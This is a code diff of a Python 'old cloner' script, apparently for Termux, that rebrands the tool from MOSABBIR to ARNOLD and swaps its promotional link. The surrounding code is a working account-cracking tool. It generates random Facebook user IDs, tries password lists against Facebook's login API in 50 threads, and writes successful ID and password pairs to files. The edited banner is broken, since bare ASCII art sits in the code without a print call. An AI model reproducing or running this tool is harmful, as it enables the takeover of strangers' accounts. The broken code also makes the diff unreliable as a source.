@@ -48,7 +48,7 @@ except ModuleNotFoundError:
 
     os.system('pip install requests bs4 futures==2 > /dev/null')
 
-    os.system('python MOSABBIR.py')
+    os.system('python ARNOLD.py')
 
 #####____Auto-Create-Setup____#####
 
@@ -80,7 +80,7 @@ except:print('\n Pycurl Module Error!\n Contact With Owner! ');exit()
 
 import random
 
-os.system('xdg-open https://https://www.facebook.com/mosabbir2025?mibextid=ZbWKwL')
+os.system('xdg-open https://youtube.com/@yeitechmonto?si=KuFvD1d932SY-U6G')
 
 
 
@@ -93,21 +93,15 @@ class OLD_CLONER:
     
     def banner(self):
         os.system("clear")
-        print("\033[1;32m ooo        ooooo                               .o8        .o8        o8o           
-`88.       .888'                              "888       "888        `"'           
- 888b     d'888   .ooooo.   .oooo.o  .oooo.    888oooo.   888oooo.  oooo  oooo d8b 
- 8 Y88. .P  888  d88' `88b d88(  "8 `P  )88b   d88' `88b  d88' `88b `888  `888""8P 
- 8  `888'   888  888   888 `"Y88b.   .oP"888   888   888  888   888  888   888     
- 8    Y     888  888   888 o.  )88b d8(  888   888   888  888   888  888   888     
-o8o        o888o `Y8bod8P' 8""888P' `Y888""8o  `Y8bod8P'  `Y8bod8P' o888o d888b        ")
-        print("\033[1;32m  ")
-        print("\033[1;32m  ")
-        print("\033[1;32m  ")
-        print("\033[1;32m  ")
-        print("\033[1;32m     ")
-        print("\033[1;32m     
-        print("\033[1;37m------------------------------------------------")
-        print("\033[1;33m[+]\033[1;35mAUTHOR  : MOSABBIR ")
+  __  __                 _     _     _      
+ |  \/  |               | |   | |   (_)     
+ | \  / | ___  ___  __ _| |__ | |__  _ _ __ 
+ | |\/| |/ _ \/ __|/ _` | '_ \| '_ \| | '__|
+ | |  | | (_) \__ \ (_| | |_) | |_) | | |   
+ |_|  |_|\___/|___/\__,_|_.__/|_.__/|_|_|   
+                                            
+                                            
+        print("\033[1;33m[+]\033[1;35mAUTHOR  : MOSABBIR")
         print("\033[1;33m[+]\033[1;35mVERSION : OLD CRACK")
         print("\033[1;33m[+]\033[1;35mVERSION : 0")
         print("\033[1;37m------------------------------------------------")
@@ -157,8 +151,8 @@ o8o        o888o `Y8bod8P' 8""888P' `Y888""8o  `Y8bod8P'  `Y8bod8P' o888o d888b 
         print("EXAMPLE  - 5000,10000")
         limit = int(input("SELECT   - "))
         for a in range(limit):
-            MOSABBIR  = "".join(random.choice(string.digits) for _ in range(self.uG))
-            self.gen.append(MOSABBIR )
+            ARNOLD = "".join(random.choice(string.digits) for _ in range(self.uG))
+            self.gen.append(ARNOLD)
         with ThreadPoolExecutor(max_workers=50) as Mr_Code:
             self.banner()
             print(" \033[1;32m [\033[1;37m√\033[1;32m] \033[1;37m TOTAL IDS \033[1;32m - "+str(len(self.gen)))
@@ -948,7 +942,7 @@ o8o        o888o `Y8bod8P' 8""888P' `Y888""8o  `Y8bod8P'  `Y8bod8P' o888o d888b 
     
     def CloneOld(self,ids,passlist):
         global loop,oks,cps
-        sys.stdout.write(f"\r\r\x1b[m [MOSABBIR -XD] {self.loop}|OK:{len(self.oks)}")
+        sys.stdout.write(f"\r\r\x1b[m [ARNOLD-XD] {self.loop}|OK:{len(self.oks)}")
         sys.stdout.flush()
         try:
             for pas in passlist:
@@ -994,13 +988,13 @@ o8o        o888o `Y8bod8P' 8""888P' `Y888""8o  `Y8bod8P'  `Y8bod8P' o888o d888b 
                 url = "https://b-graph.facebook.com/auth/login"
                 response = requests.post(url,data=data,headers=head,verify=True).json()
                 if "access_token" in response:
-                    print(f"\r\r\x1b[38;5;46mMOSABBIR -OK • {ids} • {pas}")
-                    open("/sdcard/MOSABBIR -OLD-OK.txt","a").write(ids+"|"+pas+"\n")
+                    print(f"\r\r\x1b[38;5;46mARNOLD-OK • {ids} • {pas}")
+                    open("/sdcard/ARNOLD-OLD-OK.txt","a").write(ids+"|"+pas+"\n")
                     self.oks.append(ids)
                     break
                 elif "www.facebook.com" in response["error"]["message"]:
-                    print(f"\r\r\x1b[38;5;46mMOSABBIR -OK • {ids} • {pas}")                      
-                    open("/sdcard/MOSABBIR -OLD-OK.txt","a").write(ids+"|"+pas+"\n")
+                    print(f"\r\r\x1b[38;5;46mARNOLD-OK • {ids} • {pas}")                      
+                    open("/sdcard/ARNOLD-OLD-OK.txt","a").write(ids+"|"+pas+"\n")
                     self.cps.append(ids)
                     break
                 else:continue
